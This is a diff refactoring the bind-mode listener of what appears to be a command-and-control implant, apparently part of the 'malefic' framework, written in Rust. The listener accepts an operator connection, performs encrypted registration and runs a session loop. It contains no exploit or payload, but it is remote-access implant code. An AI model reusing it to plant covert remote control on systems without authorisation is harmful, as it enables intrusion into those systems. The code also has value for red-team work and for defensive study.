@@ -1,80 +1,139 @@
-use malefic_core::config;
-use malefic_core::transport::{Client, Transport, Listener, ListenerExt};
-use malefic_proto::crypto::new_cryptor;
-use malefic_helper::debug;
-use malefic_proto::marshal_one;
-use crate::stub::{MaleficStub};
-use crate::malefic::MaleficChannel;
+use malefic_common::debug;
+use malefic_config as config;
+use malefic_stub::channel::MaleficChannel;
+use malefic_stub::stub::{build_connection, MaleficStub};
+use malefic_transport::{ConnectionRunner, Listener, ListenerExt};
+
+use crate::session_loop::{enforce_guardrail, BindStrategy, SessionLoop};
 
 pub struct MaleficBind {
     stub: MaleficStub,
-    listener: Listener, 
-    client: Client,
-    initialize: bool,
+    listener: Listener,
+    initialized: bool,
 }
 
 impl MaleficBind {
-    pub async fn new(channel: MaleficChannel) -> Result<Self, Box<dyn std::error::Error>> {
-        let stub = MaleficStub::new([0; 4], channel);
-        let addr = config::URLS.first().unwrap().clone();
+    pub async fn new(channel: MaleficChannel) -> anyhow::Result<Self> {
+        // Get listening address from config
+        let addr = config::SERVER_CONFIGS
+            .first()
+            .ok_or_else(|| anyhow::anyhow!("No server configured for bind mode"))?
+            .address
+            .clone();
 
-        // 使用静态类型的 Listener 绑定地址
-        let listener = Listener::bind(addr.as_str()).await.map_err(|e| {
-            debug!("Failed to bind listener: {:#?}", e);
-            panic!("Failed to bind listener");
-        }).unwrap();
+        // Bind listening address
+        let listener = Listener::bind(addr.as_str())
+            .await
+            .map_err(|e| {
+                debug!("Failed to bind listener: {:#?}", e);
+                panic!("Failed to bind listener");
+            })
+            .unwrap();
 
         debug!("Listening on {}", addr);
-        let iv: Vec<u8> = config::KEY.to_vec().iter().rev().cloned().collect();
 
-        let client = Client::new(new_cryptor(config::KEY.to_vec(), iv))
-            .map_err(|e| {
-                debug!("[bind] Failed to initialize client: {}", e);
-                e
-            })?;
+        Ok(Self::new_with_listener(
+            MaleficStub::new([0; 4], channel),
+            listener,
+        ))
+    }
 
-        Ok(MaleficBind {
-            client,
+    pub fn new_with_listener(stub: MaleficStub, listener: Listener) -> Self {
+        MaleficBind {
             stub,
             listener,
-            initialize: false
-        })
+            initialized: false,
+        }
     }
-    
-    pub async fn init(&mut self, transport: Transport) -> anyhow::Result<()> {
-        let init = self.client.read(transport.clone()).await?;
-        self.stub.meta.set_id(init.session_id);
-        let data = marshal_one(init.session_id, self.stub.register_spite(), self.stub.meta.get_encrypt_key())?;
-        self.client.stream.send(transport.clone(), data.pack()).await.map_err(|e| {
-            debug!("[bind] Failed to send data: {:#?}", e);
-            e
-        })?;
-        self.initialize = true;
-        debug!("Init success");
-        let _ = transport.clone().close().await;
-        Ok(())
-    }
-    
+
     pub async fn run(&mut self) -> Result<(), ()> {
         loop {
-            match self.listener.accept().await {
-                Ok(transport) => {
-                    let transport = Transport::new(transport);
-                    if !self.initialize {
-                        self.init(transport).await.map_err(|e| {
-                            debug!("[bind] Failed to init: {:#?}", e);
-                        })?;
-                    }else{
-                        if let Err(e) = self.stub.process_data(transport, &mut self.client).await {
-                            debug!("[bind] Error processing spite data: {:#?}", e);
-                            continue;
-                        }
-                    }
-                }
+            match self.run_once().await {
+                Ok(()) => {}
                 Err(e) => {
-                    debug!("[bind] Failed to accept connection: {:#?}", e);
+                    debug!("[bind] Runner error: {:?}, retrying accept...", e);
+                    continue;
                 }
             }
         }
+    }
+
+    pub async fn run_once(&mut self) -> anyhow::Result<()> {
+        enforce_guardrail();
+
+        let transport = self
+            .listener
+            .accept()
+            .await
+            .map_err(|e| anyhow::anyhow!("Failed to accept connection: {:#?}", e))?;
+
+        let connection = build_connection(
+            transport,
+            self.stub.meta.get_uuid(),
+            self.stub.meta.get_encrypt_key(),
+            self.stub.meta.get_decrypt_key(),
+        )
+        .map_err(|e| anyhow::anyhow!("Failed to build connection: {:#?}", e))?;
+
+        let runner = self.init(connection).await?;
+        self.initialized = true;
+        self.run_session(runner).await
+    }
+
+    pub async fn run_session(&mut self, mut runner: ConnectionRunner) -> anyhow::Result<()> {
+        let mut session_loop = SessionLoop::new(BindStrategy);
+        session_loop.run(&mut self.stub, &mut runner).await?;
+        Ok(())
+    }
+
+    /// Bind initialization: receive init request and send registration response
+    ///
+    /// Returns initialized ConnectionRunner (Heartbeat mode)
+    async fn init(
+        &mut self,
+        connection: malefic_transport::Connection,
+    ) -> anyhow::Result<ConnectionRunner> {
+        // Split connection to manually handle init flow
+        let (mut reader, mut writer) = connection.split();
+
+        // 1. Receive init request
+        let received_spites = reader
+            .receive()
+            .await
+            .map_err(|e| anyhow::anyhow!("Failed to receive init request: {:?}", e))?;
+
+        debug!(
+            "[bind init] Received init request with {} spites",
+            received_spites.spites.len()
+        );
+
+        // 2. Process init
+        self.stub
+            .handler(received_spites)
+            .await
+            .map_err(|e| anyhow::anyhow!("Failed to handle init spites: {:?}", e))?;
+
+        // 3. Prepare response
+        let response_spites = self
+            .stub
+            .prepare_spites()
+            .await
+            .map_err(|e| anyhow::anyhow!("Failed to prepare response: {:?}", e))?;
+
+        // 4. Send response
+        writer
+            .send(response_spites)
+            .await
+            .map_err(|e| anyhow::anyhow!("Failed to send register response: {:?}", e))?;
+
+        debug!(
+            "[bind init] Init success with session_id: {:?}",
+            self.stub.meta.get_uuid()
+        );
+
+        // 5. Create Heartbeat Runner (default mode)
+        let runner = ConnectionRunner::new_from_split(reader, writer);
+
+        Ok(runner)
     }
 }
